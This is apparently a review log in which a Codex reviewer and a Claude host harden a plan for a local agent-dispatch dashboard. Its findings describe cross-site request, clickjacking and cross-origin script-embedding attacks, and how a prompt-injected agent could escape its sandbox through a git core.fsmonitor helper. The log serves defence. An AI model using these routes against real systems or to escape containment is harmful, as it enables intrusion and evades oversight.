   "evidence": "pty.fork makes the shell a session leader, but interactive job control can place foreground pipelines and background jobs in different process groups. Killing only the shell's group does not guarantee termination of those jobs; a job that handles or ignores SIGHUP can survive. Waiting for the shell alone cannot establish the acceptance criterion that closing a tab leaves no process behind.",
   "fix": "Define cleanup for all owned terminal-session jobs or descendants, including their separate process groups. Stop reader activity safely and reap direct children before discarding ownership. Cover a foreground or background job outside the shell's process group."
  },
  {
   "id": "MPD-29",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:98",
   "evidence": "The specified protocol returns term_id only when opening a terminal and requires that id to attach. It provides neither terminal inventory nor persisted client identifiers. After a page reload, the new JavaScript state cannot reconstruct the existing tabs using the listed events alone. The current connect handler always opens a new PTY, which would accumulate detached terminals if merely renamed.",
   "fix": "Add a terminal-inventory operation or server-pushed inventory on connection, with metadata and lifecycle state sufficient to rebuild tabs. Reconnect should restore existing tabs before opening replacements and handle stale identifiers."
  },
  {
   "id": "MPD-30",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:98",
   "evidence": "term_attach explicitly replays scrollback before joining the live room. Output produced after the replay snapshot but before room membership is established reaches neither the replay nor the client. A reloaded terminal can therefore permanently miss lines while its process is active.",
   "fix": "Make subscription and replay ordering coherent, using sequence numbers and a captured replay boundary, or an equivalent synchronized protocol. Handle duplicates and gaps explicitly and cover output emitted during attachment."
  },
  {
   "id": "MPD-31",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:106",
   "evidence": "Existing progress events cannot supply the advertised assistant/tool/result live view across launch paths. _stream_claude_run writes JSONL and progress metadata but does not emit assistant text; the cited run_progress lines 2312/2321 belong to DeepSeek TUI. Linear Claude/Codex dispatch currently waits for communicate() to finish before parsing output. Rendering existing events alone leaves those run tabs incomplete or silent until completion.",
   "fix": "Specify a normalized incremental run-event stream for every supported backend and launch path, including Linear dispatch. Feed the same bounded in-memory stream to live tabs and reattachment rather than relying on snippets or completion-only parsing."
  },
  {
   "id": "MPD-32",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:113",
   "evidence": "The claim that confidential run-tab output is absent from disk conflicts with Decision 4a, which intentionally stores that run's output in a local side file. Existing _stream_claude_run also writes its raw stream to disk. The Phase 3 test at line 179 therefore cannot hold for a run tab displaying the same persisted headless output.",
   "fix": "Separate ephemeral interactive-terminal scrollback from the existing headless run payload. State that tabs introduce no additional persistence, and test that narrower contract while retaining the explicitly authorized local run records."
  },
  {
   "id": "MPD-33",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:87",
   "evidence": "The prerequisite dsh plan now unconditionally rejects current dsh versions for confidential projects because its installed macOS profile permits network access. This plan still describes conditional confidential eligibility and retains Phase 2 tests expecting legacy DeepSeek TUI argv to remain unchanged after those backends are retired. The dsh plan also permits runner-side commits when its sandbox cannot commit, whereas this plan assigns commits to the agent. The combined execution and test contract is inconsistent.",
   "fix": "Align Phase 2 with canonical dsh ids and current unconditional confidential rejection. Integrate any runner-side commit path explicitly into ticket ownership and seed/verification ordering. For terminal follow-up, define a supported dsh action or omit Resume in tab when no interactive backend exists."
  },
  {
   "id": "MPD-34",
   "severity": "medium",
   "path": "runner/modules/pty/__init__.py:91",
   "evidence": "The proposed skill-handoff port changes sid to term_id, but _record_pending_handoff currently writes the completed command to RUN_LOG without project or confidential context. A handoff from a new confidential-project terminal can therefore put a private command or path into the knowledge-base log instead of the redacted project record.",
   "fix": "Resolve project/confidential context from the server-owned terminal entry and pass it to the logging policy. Redact confidential handoff commands in shared logs, or retain them only in permitted local storage. Cover a confidential command sentinel through the handoff path."
  }
 ],
 "coverage": [
  "Verified the on-disk plan SHA256 b7618d682852dd58461cf8d90067d6baced775e4cbbed1f50e347a049ece3bcd and reviewed all post-approval amendments.",
  "Confirmed SocketIO wildcard configuration, startup argument parsing, PTY event handlers, and installed Engine.IO 4.13.1 Origin validation, including its request-Host-derived default.",
  "Inspected installed Flask 3.1.3 Host validation and Flask-SocketIO middleware routing; traced /run, /stream, upload, and STT side effects.",
  "Traced CLI builders, resume commands, Linear dispatch, stream writers, progress consumers, PTY readers, handoff logging, and shared-state integration.",
  "Read the referenced dsh plan and inspected the installed macOS Seatbelt profile, which restricts writes but contains no network restriction.",
  "Read Codex 0.162.0 help/version output and current official OpenAI and Claude sandbox documentation using the openai-docs skill.",
  "Checked prior findings against the preserved remedies without reopening their resolved scenarios. The moved Phase 3 checkbox and duplicated origin acceptance wording are editorial cleanup, not additional material findings."
 ],
 "limitations": [
  "This is a static plan and integration review. No tests, browser attacks, handshakes, sandbox spikes, provider requests, or agent executions were performed.",
  "Only CLI help/version commands were inspected; their output does not establish runtime sandbox or approval behavior.",
  "No files were edited and no work was delegated.",
  "The new project and terminal implementations are not available for implementation-level validation. Private registries, live sessions, pilot repositories, and launchd behavior were not inspected.",
  "Current vendor documentation may differ from installed CLI behavior; the specified spikes remain necessary after correcting the reviewed contracts."
 ]
}
```

### Host dispositions
- MPD-21 accepted: Flask TRUSTED_HOSTS from --host (Flask 3.1.3 installed; default None verified).
- MPD-22 accepted: verified GET /stream (app.py:2634) dispatches from query args. Fix = one before_request guard on Sec-Fetch-Site (fallback Origin), exempting only top-level GET / navigation; header-less local clients allowed. Chosen over per-route CSRF tokens: one hook covers every route incl. /stream, uploads, STT, PATCH; /stream stays GET (EventSource).
- MPD-23 accepted: `codex exec --help` says --approve-for-me itself uses workspace-write; dropped --sandbox; argv errors are fixed, not fallback triggers.
- MPD-24 accepted: Codex pins network_access=false + writable_roots=[] via -c; Claude settings pin failIfUnavailable/allowUnsandboxedCommands=false/no excludedCommands + narrowed --setting-sources (worktree .claude/settings.json is agent-writable). Spike adds permissive-config cases.
- MPD-25 accepted: confidential verify under sandbox-exec profile (deny network*, file-write* outside worktree/git common dir/tmp); spike (g); failure => verify: manual.
- MPD-26 accepted: resume via _ai_cli(binding, interactive=True); hidden when no eligible form or dsh.
- MPD-27 accepted: bound-worktree tabs hold the ticket lock while open; run tabs and main-path shells take none.
- MPD-28 accepted: kill every pgid in the shell session (pgrep -s sid); setsid daemons documented as limit.
- MPD-29 accepted: term_list inventory; connect no longer opens a PTY.
- MPD-30 accepted in simpler form: one per-terminal lock shared by reader-emit and attach(join+snapshot), instead of sequence numbers.
- MPD-31 accepted: verified 2312/2321 are not Claude-path events; launch helper streams line-by-line for all paths incl. Linear, bounded per-run ring, run_event.
- MPD-32 accepted: tabs add no persistence; run records (4a side file, stream log) unchanged; test narrowed.
- MPD-33 accepted: dsh always rejected for confidential; Phase 2 backend list/test aligned to canonical ids post-swap; runner-side dsh commit ordered reap→add→commit→seed check→verify under lock; no Resume in tab for dsh.
- MPD-34 accepted: verified _record_pending_handoff writes RUN_LOG without project context; handoff now goes through binding-aware _write_run_log.
- Editorial: Phase 3 N/A format fixed; duplicate origin criterion merged into one security acceptance line.
- Revised plan sha256: bd2f69726f739763c8b2c498818c0cd368b68a72a503f7b13f4b71aca63b7a04

## Round 6 — Codex (2026-10-14)
- Result: `<session-scratchpad>/claudex/r6/claudex-ii95b1fn/result.json` · session 01a1376d… · plan sha256 bd2f6972… · 363 s · assurance cross_provider
- Verdict: **REVISE** (1 high, 2 medium)
```json
{
 "verdict": "REVISE",
 "summary": "The plan hash matches, and most prior findings have explicit remedies. Three concrete defects remain in the revised browser guard and macOS terminal cleanup.",
 "findings": [
  {
   "id": "MPD-35",
   "severity": "high",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:46",
   "evidence": "Requests without Sec-Fetch-Site and Origin are not necessarily local CLI requests. A browser without Fetch Metadata support can send an image GET without either header. Metadata is also omitted for non-trustworthy HTTP targets, including some configured non-loopback hosts. The guard then admits /stream?prompt=…, which starts an agent. Host validation does not block requests addressed to an allowed host. [Fetch Metadata specification](https://www.w3.org/TR/fetch-metadata/#integration), [Origin-header rules](https://fetch.spec.whatwg.org/#append-a-request-origin-header).",
   "fix": "Require an independent request-intent proof for side-effect endpoints when browser provenance headers are absent. For EventSource, use a dashboard-issued unguessable token; provide an explicit protected request mechanism for CLI clients. Retain unrestricted header-less access only for harmless routes."
  },
  {
   "id": "MPD-36",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:46",
   "evidence": "Sec-Fetch-Mode: navigate does not establish a top-level navigation: iframe loads also use navigate. The described exemption can therefore admit a cross-site iframe containing the dashboard, enabling clickjacking. During the independently shipped precondition phase, the current dashboard also automatically opens a PTY on connection (index.html:3518-3522). [Navigation destinations](https://www.w3.org/TR/fetch-metadata/#sec-fetch-dest-header).",
   "fix": "Require Sec-Fetch-Dest: document for the top-level exemption and add a frame-ancestors policy. Explicitly reject the cross-site iframe case while preserving ordinary links and bookmarks."
  },
  {
   "id": "MPD-37",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:132",
   "evidence": "The installed macOS /usr/bin/pgrep does not support -s. Its binary option string is DF:G:ILP:U:ac:d:fg:ilnoqt:u:vx, and /usr/share/man/man1/pgrep.1 comments out the session-selection option. The proposed cleanup command therefore cannot enumerate terminal-session jobs on this host. Additionally, pgrep outputs PIDs, not PGIDs.",
   "fix": "Use a supported macOS process enumeration mechanism, determine each process's session and process-group ids, and deduplicate PGIDs before signalling. Treat enumeration failures as cleanup failures. Cover groups whose original leader has already exited."
  }
 ],
 "coverage": [
  "Read the revised plan and verified SHA256 bd2f69726f739763c8b2c498818c0cd368b68a72a503f7b13f4b71aca63b7a04.",
  "Compared all fourteen Round 5 findings with the revised remedies; confirmed the Host-validation design and preserved prior plan-level fixes.",
  "Traced /stream dispatch, Flask Host validation, Engine.IO Origin checks, dashboard connection behavior, PTY creation/readers, and handoff logging.",
  "Reviewed revised sandbox, verification, resume, locking, event-stream, persistence, and dsh integration contracts against existing parsers and the referenced dsh plan.",
  "Inspected installed macOS pgrep documentation and binary option metadata, plus primary Fetch specifications."
 ],
 "limitations": [
  "No tests, browser attacks, handshakes, sandbox probes, process launches, or cleanup operations were performed.",
  "No files were edited and no work was delegated.",
  "This remains a plan review; the new project and terminal implementations are unavailable for implementation-level validation.",
  "Private registry entries, pilot repositories, live session stores, and launchd behavior were not inspected. The stated test baseline remains unverified."
 ]
}
```

### Host dispositions
- MPD-35 accepted, by a different route than the Fetch-Metadata guard: GET /stream has no caller (no EventSource in index.html; grep over the repo and LaunchAgents finds none), so it is deleted. Every request except GET /, favicon and static now requires a per-process X-AgenticOS-Token, rendered into index.html and added by one fetch/XHR wrapper. Socket.IO connects with auth.token and the connect handler rejects a mismatch. The Sec-Fetch guard is dropped as redundant. No CLI HTTP client exists, so there is no token file (YAGNI).
- MPD-36 accepted: CSP frame-ancestors 'none' on every response. With the token required on everything, the navigate exemption question disappears; framing is blocked so the token and auto-PTY cannot be used from an iframe.
- MPD-37 accepted: verified `pgrep -s` exits 2 on this Mac, and ps `sess` reports 0. Now ps -A -o pid=,pgid= with os.getsid(pid)==shell sid, pgids deduplicated. A failed enumeration means cleanup_failed. Test covers a group whose leader has exited.
- Also: 3a no longer lists /stream as a launch site.
- Revised plan sha256: 9f8b839f50ef7ad72c68bf6f0e6db7e6abf3ec3cd21c72cece2a722ca0586d47

## Round 7 — Codex (2026-10-14)
- Result: `<session-scratchpad>/claudex/r7/claudex-ypzd02nm/result.json` · session 01a1376d… · plan sha256 9f8b839f… · 203 s · assurance cross_provider
- Verdict: **REVISE** (1 medium, 1 low)
```json
{
 "verdict": "REVISE",
 "summary": "The revision addresses MPD-35–37 at the plan level. The token requirement introduces an attachment-access regression, and the companion plan contradicts the removal of /stream.",
 "findings": [
  {
   "id": "MPD-38",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:45",
   "evidence": "The token hook protects attachment downloads, but the client changes cover only fetch/XHR. _renderAttachList creates ordinary links at runner/templates/index.html:3797. Upload returns /api/board/uploads/<filename>, served by runner/modules/pty/__init__.py:208. Clicking that link cannot supply X-AgenticOS-Token, so uploading succeeds but opening the attachment returns 403.",
   "fix": "Add an authenticated attachment-download flow using the token-bearing fetch wrapper. Preserve endpoint protection, avoid placing the process token in URLs, and download or isolate active content rather than executing it in the dashboard origin. Include opening an uploaded attachment in verification."
  },
  {
   "id": "MPD-39",
   "severity": "low",
   "path": "docs/exec-plans/active/2026-10-14-dsh-backend-swap.md:51",
   "evidence": "The security precondition deletes /stream before other work, but the companion plan explicitly requires /stream to retain its current behavior. Its command and environment integration also still name that route at lines 48 and 55. The two active work orders give conflicting requirements for the same endpoint.",
   "fix": "Update the companion plan to recognize /stream's deletion and remove its dispatch integration requirements, retaining text-mode support for Linear skill routing."
  }
 ],
 "coverage": [
  "Verified the on-disk plan SHA256 matches 9f8b839f50ef7ad72c68bf6f0e6db7e6abf3ec3cd21c72cece2a722ca0586d47.",
  "Checked MPD-35–37 dispositions against the revised token, framing and terminal-session cleanup design.",
  "Traced dashboard fetch calls, Socket.IO connection setup, native attachment links, upload writers and attachment-serving routes.",
  "Inspected installed Flask-SocketIO and Engine.IO middleware dispatch to distinguish HTTP-hook coverage from Socket.IO authentication.",
  "Searched runner, scripts and tests for /stream and EventSource callers; checked companion-plan backend, commit, resume and endpoint requirements."
 ],
 "limitations": [
  "Static plan and source review only; no files edited, tests run, agents delegated, browser checks, handshakes or sandbox probes performed.",
  "The proposed token controls and terminal registry are not implemented in the inspected source; their runtime behavior remains unverified.",
  "LaunchAgent caller claims and private project configuration were not independently inspected."
 ]
}
```

### Host dispositions
- MPD-38 accepted. GET /api/board/uploads/<f> is exempt from the token: it is a read-only serve, a cross-site page cannot read it without CORS, and the Host check blocks rebinding. The token stays out of URLs. The serve route adds CSP sandbox + nosniff, so an uploaded HTML/SVG runs in an opaque origin with no scripts and cannot read the token. Verification adds an attachment-open test and a malicious-upload test. A fetch-and-blob download flow was rejected: it adds client code for no extra protection.
- MPD-39 accepted. dsh plan Decision 2 edited (lines 48/51/55) to drop the /stream requirements; Linear routing keeps text mode. dsh plan sha256 is now 77e13df9…; its Round 6 approval is void and the edit is logged in its review log. It needs a re-review.
- Revised plan sha256: 8e0b84221d6a5eb32d67e96f4b62860b243893a3f2bd6d342d375f972eb7c9c2

## Round 8 — Codex (2026-10-14)
- Result: `<session-scratchpad>/claudex/r8/claudex-g93zpij3/result.json` · session 01a1376d… · plan sha256 8e0b8422… · 202 s · assurance cross_provider
- Verdict: **REVISE** (1 medium)
```json
{
 "verdict": "REVISE",
 "summary": "MPD-38’s attachment-access regression and MPD-39’s cross-plan conflict are addressed. The new attachment exemption leaves a cross-origin disclosure path.",
 "findings": [
  {
   "id": "MPD-40",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:46",
   "evidence": "Absence of CORS does not prevent classic script embedding. The upload route accepts arbitrary extensions, and send_from_directory infers MIME types (runner/modules/pty/__init__.py:184–213). If an uploaded config.js contains window.config = {secret: '…'}, an attacker page can load its predictable localhost URL through <script src>, then read window.config. The Host is legitimate, no token is required, and nosniff accepts correctly typed JavaScript. CSP sandbox governs documents, not the embedding page’s script execution. See [cross-origin embedding](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy#cross-origin_network_access) and [sandbox scope](https://www.w3.org/TR/CSP3/#directive-sandbox).",
   "fix": "Add Cross-Origin-Resource-Policy: same-origin to attachment responses, retaining sandbox and nosniff. Verify that a foreign page cannot execute an uploaded JavaScript fixture or observe its sentinel, while ordinary dashboard attachment links still work. [CORP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cross-Origin_Resource_Policy) specifically blocks cross-origin no-cors embedding."
  }
 ],
 "coverage": [
  "Verified the plan SHA256 matches 8e0b84221d6a5eb32d67e96f4b62860b243893a3f2bd6d342d375f972eb7c9c2.",
  "Checked MPD-38 against attachment links, upload writers, file serving and MIME inference.",
  "Verified the dsh companion SHA256 begins 77e13df9 and Decision 2 removes /stream integration requirements.",
  "Checked browser sandbox, nosniff and cross-origin embedding semantics against W3C and Mozilla documentation."
 ],
 "limitations": [
  "Static review only; no edits, tests, browser experiments, sandbox probes or delegation performed.",
  "The proposed security controls remain unimplemented in the inspected source.",
  "The companion plan was checked for cross-plan consistency, not given a standalone approval."
 ]
}
```

### Host dispositions
- MPD-40 accepted: no-cors <script src> embedding of an uploaded .js bypasses "no CORS". The attachment serve now adds Cross-Origin-Resource-Policy: same-origin (plus sandbox and nosniff). A header test and a manual cross-origin <script src> sentinel check were added.
- Revised plan sha256: a04f619e8c1e74dfe458b254ad3b03df3a66043bb02a43752bafdace7cc4590c

## Round 9 — Codex (2026-10-14)
- Result: `<session-scratchpad>/claudex/r9/claudex-d3y7bdmd/result.json` · session 01a1376d… · 36 s · assurance cross_provider · observed model unknown (CLI default)
- Verdict: **APPROVED**, no findings. Approval bound to plan sha256 a04f619e8c1e74dfe458b254ad3b03df3a66043bb02a43752bafdace7cc4590c.
- Limitations (reviewer): approval covers the plan, not an implemented boundary. No tests, browser checks or sandbox probes were run. Spikes, implementation and dogfooding remain.

## Status (2026-10-14)
- Post-approval amendments re-reviewed in Rounds 5–9: 20 findings (MPD-21…40). All accepted; MPD-30, MPD-35 and MPD-38 were resolved in a simpler form than the reviewer proposed. 9/20 rounds used in total.
- Companion dsh plan edited for MPD-39. Its approval is void (sha 77e13df9…) and it needs a re-review.
- The pre-existing holes (Socket.IO "*", GET /stream, no Host check) are still live in the code. Build is NOT authorized.

### Post-approval edit — host (2026-10-14), NOT YET REVIEWED
- User: "DSH-30 放到 2026-10-13-multi-project-dispatch.md".
- Added a Phase 2 checklist item: the tracker reset boundary (DSH-30).
  - Source: Codex inspection 4 of the dsh backend swap.
  - Problem: a drag to Todo through the tracker routes writes no reset record, so retry still resumes the old session, for every agent.
  - The dsh plan rejected it as out of scope, because it is pre-existing and affects all agents.
- Plan sha256 is now c6354d8fda91cb232a0ed54bacef4a3ba1f52d05d6ce47e7fa70ca1ae878c3e4. **The Round 9 approval (a04f619e…) no longer covers it.** Re-review before build.

## Round 10 prep — host (2026-10-14)
- User asked to re-review (/claudex-loop, mode=review). Roles unchanged: reviewer = Codex, resuming session 01a1376d…; CLI default model and effort; fallback same-provider-on-unavailable; build not authorized.
  1. User edit (committed 479bc7f): Phase 2 DSH-30 tracker reset-boundary item (moved from the dsh plan inspection 4).
  2. The dsh backend swap has LANDED (3647fec, archived in docs/exec-plans/completed/). Its spike (e) showed dsh commits in a worktree under workspace-write. So: the runner-side commit (MPD-33) is now N/A; deepseek-tui/deepseek references were replaced by canonical claude/codex/dsh; non-confidential dsh keeps workspace-write; dsh is always rejected for confidential projects.
  3. RUN_LOG moved out of the knowledge base (8167cfa). It now defaults to state/run_log.jsonl in this checkout (app.py:126); state/ and outputs/ are gitignored. HOST SIMPLIFICATION, please scrutinize: Decision 4a no longer uses a confidential side file, "[local]" placeholders or load_run_payload. Those existed only because RUN_LOG lived in the KB checkout, which is a registered project. Replacement: a location guard. Confidential dispatch is refused if RUN_LOG, STATE_DIR or OUTPUTS_DIR resolves inside a registered project and is not ignored by its committed rules. Redaction now applies only to what leaves the machine (Linear, Decision 4). The MPD-32/34 text and tests were adjusted to match. Readers of run_log found by grep: runner/app.py, run_skill.py, dashboard.py, scripts/sync_state_runs.py, scripts/verify_trash.py, scripts/quick_check.py; all local.
  4. Format: the user's global rule now requires every action, check and test case to be its own checkbox, with no plain bullets nested under a box. The checklist and acceptance criteria were split accordingly, and the Security Precondition verification list moved into Phase 0 checkboxes. Please flag any lost or merged requirement.
  5. Line numbers refreshed against current main (e.g. socketio :143, /stream :2539, /run :2367, main :3317, cwd sites linear :544,580 and app :2395,2456,2931, retry no-op guard :2869, Human Feedback :2904, _linear_comment_body linear :232, attach link index.html:4005, connect index.html:3728-3732).
  6. Fetch wrapper clarified: window.fetch is replaced once, so direct fetch calls (the STT block, /api/linear/id-aliases) are covered.
  Live check today: the runner (restarted) still serves GET /stream 200, and Host: evil.example gets 200. The holes are open; the Security Precondition is not built.
- Plan sha256 sent for review: 44d10b998cbbe382cdcb2ba742081677447356f6f0d674d1109bd84331202a70

## Round 10 — Codex (2026-10-14)
- Result: `<session-scratchpad>/claudex/r10/claudex-iq50v9qp/result.json` · session 01a1376d… · plan sha256 44d10b99… · 303 s · assurance cross_provider
- Verdict: **REVISE** (1 high, 2 medium, 1 low)
```json
{
 "verdict": "REVISE",
 "summary": "The default local run-log location supports removing confidential side files, but the replacement guard leaves unsafe paths and writers unprotected. The reset boundary also needs protection against later writes from older runs.",
 "findings": [
  {
   "id": "MPD-41",
   "severity": "high",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:83",
   "evidence": "The guard rejects unsafe locations only inside registered projects. RUN_LOG_PATH=/tmp/unregistered-repo/log.jsonl passes that predicate even if the destination is tracked in a public repository. runner/app.py:126 accepts the override, and _write_run_log at :1848–1889 writes full confidential prompts, outputs and errors there. This contradicts the acceptance criterion at plan :297 requiring records under this checkout’s ignored state/outputs directories.",
   "fix": "Enforce the runner-owned storage boundary independently of registry membership. Reject resolved confidential record destinations outside the permitted ignored directories, or retain redacted logging for external overrides. Add an unregistered-repository override case."
  },
  {
   "id": "MPD-42",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:154",
   "evidence": "Decision 4a specifies refusing confidential dispatch when storage is unsafe, while terminal handoffs now persist their raw commands without redaction. _record_pending_handoff calls _write_run_log directly (runner/modules/pty/__init__.py:91–113), bypassing dispatch. If the server remains available with confidential dispatch disabled, a confidential project's shell handoff can still write its command to the rejected RUN_LOG destination.",
   "fix": "Either fail startup for unsafe record destinations or enforce the location policy at every confidential persistence entry point, including terminal handoffs. Add a handoff test with an invalid destination that proves no confidential command is written."
  },
  {
   "id": "MPD-43",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:227",
   "evidence": "Appending a Todo lifecycle record alone does not preserve the reset against subsequent writes from older runs. Tracker PATCH routes permit Todo updates while a run is active; that run later appends its session-bearing completion (runner/app.py:2992–3002). _get_task_agent_lock at :2320–2328 accepts that newer append before reaching the reset marker, resurrecting the discarded session and agent lock. Restore similarly appends an old session-bearing record at :2773–2781.",
   "fix": "Persist a task-level reset generation and associate launches and sessions with it. Completions and restores from older generations must not become eligible for resume or agent locking. Cover reset-during-run followed by completion, and restoration of a pre-reset attempt, using the actual routes."
  },
  {
   "id": "MPD-44",
   "severity": "low",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:162",
   "evidence": "The requested one-action/one-test-case-per-checkbox conversion remains incomplete. Line 162 combines fetch, XHR and Socket.IO changes; :169 combines missing-token, wrong-token and valid-token cases; :254 combines overlapping dispatch and CLI cleanup; :282 combines shell persistence and run-tab persistence checks. The reset’s fresh-launch-without-session requirement at :227 also lacks its own integration-test checkbox.",
   "fix": "Split independent actions and test cases into separate checkboxes, and add an explicit tracker-reset → fresh launch failing before a session id → retry case."
  }
 ],
 "coverage": [
  "Verified the on-disk SHA256 matches 44d10b998cbbe382cdcb2ba742081677447356f6f0d674d1109bd84331202a70.",
  "Reviewed the complete supplied plan and repository changes since the prior approval.",
  "Traced run-log configuration, append writers, task/job-state writers, lifecycle updates, terminal handoffs and local readers/scripts.",
  "Traced dashboard reset requests through both tracker PATCH routes, retry selection, session-lock lookup, completion and restore writers.",
  "Checked canonical agent handling, dsh environment policy and the archived worktree-commit spike evidence.",
  "Compared the revised checklist with prior requirements; earlier browser-security remedies remain present."
 ],
 "limitations": [
  "Static review only; no edits, tests, live requests, browser checks, sandbox probes or delegation performed.",
  "Recorded dsh spike results were inspected but not independently reproduced.",
  "The proposed guard and reset changes are not implemented; this review assesses their design against current callers and writers.",
  "Private project configuration and LaunchAgent configuration were not inspected."
 ]
}
```

### Host dispositions
- MPD-41 accepted: the guard no longer depends on registry membership. With any confidential project registered, startup fails unless RUN_LOG, STATE_DIR and OUTPUTS_DIR are inside this checkout and git-ignored here. Tests added: an unregistered public-repo override, a registered-project override, the default location, and the no-confidential case.
- MPD-42 accepted via the startup failure, not per-writer checks: refusing to start covers every _write_run_log caller (dispatch, terminal handoff, stall detection) with one check.
- MPD-43 accepted: new Decision 11, a per-task reset_gen in task_state.json. Every reset route increments it under the 4b lock; launches record it; retry and _get_task_agent_lock accept only current-generation records. Chosen over timestamps because it does not depend on the clock. Tests added: reset during a live run then completion, restore of a pre-reset run, and reset then a fresh launch that fails before emitting a session id.
- MPD-44 accepted: split client/server token items, the /run token cases, the after_request vs attachment headers, concurrent launch vs cleanup, the shell vs run persistence tests, the tab-lock retry vs cleanup tests, the Resume-in-tab cases, the manual checks, PATH vs placeholder expansion, symlink vs path rejection, and the Claude settings vs --setting-sources tests. The DSH-30 design moved out of a checkbox into Decision 11, so no plain bullets sit under any box.
- Revised plan sha256: f93485fe1c1c21d5c121332e731e2bd1e4aea594e3883cc7d80a126c36349303

## Round 11 — Codex (2026-10-14)
- Result: `<session-scratchpad>/claudex/r11/claudex-dfalj1p_/result.json` · session 01a1376d… · 133 s · assurance cross_provider · observed model unknown (CLI default)
- Verdict: **APPROVED**, no findings. Approval bound to plan sha256 f93485fe1c1c21d5c121332e731e2bd1e4aea594e3883cc7d80a126c36349303. The approval check passed.
- Limitations (reviewer): plan-level only. The startup guard and reset generation are not implemented, and no tests, live requests or sandbox probes were run.

## Status (2026-10-14, after Round 11)
- Rounds 10–11 covered the DSH-30 edit, the dsh landing, the RUN_LOG move (Decision 4a simplified: no side file; a startup location guard instead), the checkbox format rule, and refreshed line numbers. 4 findings (MPD-41…44), all accepted. 11/20 rounds used in total.
- The Security Precondition holes are still live in the running code. Build is NOT authorized.

## Build — Phase 0 security (2026-10-14)
- Builder: Claude (this session). Pre-build base 5ce60d5 (approved plan commit). Commit a8ab382. Proof: pytest 130 passed (baseline 116 + 14 new); live curl probes; headless-Chrome checks at 127.0.0.1 and localhost (see plan checkboxes).

## Build inspection 1 — Codex, fresh session (2026-10-14)
- Result: `<session-scratchpad>/claudex/i1/…/result.json` · base 5ce60d5 · 182 s · assurance cross_provider · verdict **REVISE** (1 high, 3 medium; all against the plan's unbuilt phases)
```json
{
 "verdict": "REVISE",
 "summary": "The implemented browser guards follow the security precondition, but the remaining plan has four material isolation and shared-state gaps.",
 "findings": [
  {
   "id": "MPD-R1",
   "severity": "high",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:103",
   "evidence": "Confidential agents can write the entire Git common directory. A prompt-injected agent can set core.fsmonitor to an executable in its worktree. The runner's subsequent, unsandboxed main-checkout fingerprint invokes git status, which executes that helper with the runner's network and filesystem privileges. Killing the agent's process group does not prevent this later execution.",
   "fix": "Confine runner-owned Git inspection and lifecycle commands for confidential projects too, and disable repository-controlled executable helpers and hooks. Add a spike covering a modified core.fsmonitor configuration and a post-checkout hook."
  },
  {
   "id": "MPD-R2",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:70",
   "evidence": "git check-ignore also reads global excludes and the repository's shared info/exclude. A seed ignored only by .git/info/exclude therefore passes the specified command despite having no committed ignore rule. The startup location guard at line 83 makes the same incorrect inference.",
   "fix": "Check the winning ignore rule's provenance and verify that its source and content belong to committed .gitignore files. Reject rules supplied only by global excludes, info/exclude, or uncommitted changes. Cover both seed and run-record location checks."
  },
  {
   "id": "MPD-R3",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:86",
   "evidence": "The serialization plan covers task_state.json and job_state.json but omits state/tasks.json. Parallel completions reach LinearModule.push_state and LocalTracker.update_issue_state; LocalTracker loads the entire file before taking its write-only _SAVE_LOCK (runner/modules/linear/local_tracker.py:70,163). Two writers updating different tickets can load the same snapshot and overwrite one another. Polling/cache sync and comment writers also rewrite this file.",
   "fix": "Include tasks.json in the serialization scope. Hold one shared lock across each complete read-modify-write transaction, including raw cache-sync and localization writers, and use unique temporary files. Validate concurrent updates to different tickets and concurrent comment/state changes."
  },
  {
   "id": "MPD-R4",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:163",
   "evidence": "reset_gen filters session selection, but the plan does not gate current-status updates. Reset a running ticket to Todo, then let its old run finish: _write_run_log updates current task status, LinearModule._mark_issue_review pushes In Review (runner/modules/linear/__init__.py:505), and retry completion also pushes review (runner/app.py:2985). The discarded generation can therefore undo the reset even though its session is no longer resumable.",
   "fix": "Keep old-generation completions in history while preventing them from updating current task status, tracker state, dispatch ownership, or current-status events. Check generation when applying queued tracker updates, and extend the live-reset scenario to assert that Todo remains current."
  }
 ],
 "coverage": [
  "Verified the plan and all five implementation/test file hashes against the manifest; confirmed the changed-file list against the supplied base.",
  "Reviewed browser token, Host and Origin guards, Socket.IO authentication, attachment response headers, fetch integration, and security test source.",
  "Traced launch, retry, reset, restore, cancellation, completion, PTY handoff, and stall-detection paths.",
  "Inspected related state writers in run_skill.py, LinearModule, and LocalTracker, plus registry examples and ignore rules."
 ],
 "limitations": [
  "No files edited, tests executed, runtime/browser probes performed, or work delegated.",
  "Unchecked phases are proposed behavior; sandbox flags, session readers, and worktree helpers remain unverified.",
  "Spec fidelity was assessed against the supplied plan and AGENTS.md; SPEC.md was not inspected."
 ]
}
```

### Host dispositions
- MPD-R1 (high) accepted: one hardened git helper (-c core.fsmonitor=false -c core.hooksPath=/dev/null, --no-ext-diff --no-textconv); confidential projects also run it under the sandbox-exec profile. The fingerprint now covers the shared git config and hooks/. If spike (g) fails, confidential dispatch is refused (this replaces "verify: manual"). Spike (h) and tests added.
